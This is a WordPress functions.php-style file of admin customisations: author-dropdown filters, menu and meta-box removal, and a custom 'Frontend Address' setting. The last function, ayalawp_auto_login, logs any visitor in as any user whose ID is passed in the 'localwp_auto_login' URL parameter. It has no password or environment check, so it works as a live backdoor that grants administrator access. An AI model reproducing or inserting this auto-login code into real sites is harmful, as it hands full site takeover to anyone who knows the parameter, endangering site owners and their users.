add_filter( 'wp_dropdown_users_args', 'rt_cl_add_to_authors_list', 99 );
function rt_cl_add_to_authors_list( $users_args ) {
	global $post_type;

	if ( is_admin() && class_exists('Rtcl' ) && current_user_can('edit_posts') && ( ! empty( $post_type ) && $post_type == rtcl()->post_type ) ) {
		unset( $users_args['capability'] );
	}

	return $users_args;
}



// Hide the "Bookings" menu item from the WordPress admin
add_action('admin_menu', 'hide_booking_menu_item');

function hide_booking_menu_item() {
    if (current_user_can('manage_options')) { // Adjust the capability check if needed
        remove_menu_page('edit.php?post_type=booking');
    }
}

// Filter author dropdown to show only shop managers for custom post type 'location'
function filter_author_dropdown_for_custom_post_type($args) {
    // Check if we are on the admin screen and editing the 'location' post type
    if ( !is_admin() || 'location' !== get_current_screen()->post_type ) {
        return $args;
    }

    // Get all users with the shop manager role
    $shop_managers = get_users(array('role' => 'shop_manager'));

    // Prepare the list of authors
    $args['include'] = wp_list_pluck($shop_managers, 'ID');
    
    return $args;
}
add_filter('wp_dropdown_users_args', 'filter_author_dropdown_for_custom_post_type');


// Remove the author meta box for the 'location' custom post type
function remove_author_meta_box_for_custom_post_type() {
    // Check if we are on the edit screen for 'location' custom post type
    if ( 'location' === get_current_screen()->post_type ) {
        remove_meta_box('authordiv', 'location', 'side');
    }
}
add_action('add_meta_boxes', 'remove_author_meta_box_for_custom_post_type');

function custom_general_settings() {
    // Register the setting
    register_setting('general', 'frontend_address_url', 'esc_url');

    // Add a new section (or use an existing section if applicable)
    add_settings_section(
        'custom_general_settings_section', // Section ID
        ' ', // Section Title (displayed in the section header)
        '__return_false', // Callback (none needed)
        'general' // Page (general settings)
    );

    // Add the field to the new section
    add_settings_field(
        'frontend_address_url', // Field ID
        'Frontend Address (URL)', // Field Title
        'frontend_address_url_callback', // Callback function
        'general', // Page (general settings)
        'custom_general_settings_section' // Section ID
    );
}
add_action('admin_init', 'custom_general_settings');

// Callback function to render the field
function frontend_address_url_callback() {
    $value = get_option('frontend_address_url', '');
    echo '<input type="url" id="frontend_address_url" name="frontend_address_url" value="' . esc_url($value) . '" class="regular-text" />';
}

// Move the custom field to be directly below the Site Address (URL)
function move_custom_field() {
    ?>
    <script>
        jQuery(document).ready(function($) {
            var customField = $('#frontend_address_url').closest('tr');
            var siteAddressField = $('#home').closest('tr'); // Site Address (URL) field

            if (siteAddressField.length) {
                customField.insertAfter(siteAddressField);
            }
        });
    </script>
    <?php
}
add_action('admin_footer', 'move_custom_field');

function ayalawp_auto_login() {
    // Check if the 'localwp_auto_login' parameter is set in the URL
    if (isset($_GET['localwp_auto_login'])) {
        $user_id = intval($_GET['localwp_auto_login']); // Get the user ID from the URL parameter

        // Ensure the user ID is valid and the user exists
        if ($user_id > 0 && $user = get_user_by('ID', $user_id)) {
            // Log in the user
            wp_set_current_user($user_id);
            wp_set_auth_cookie($user_id, true); // true sets the "remember me" cookie

            // Redirect to the dashboard or any other URL
            wp_redirect(admin_url());
            exit;
        }
    }
}

// Hook the autologin function to the 'init' action
add_action('init', 'ayalawp_auto_login');


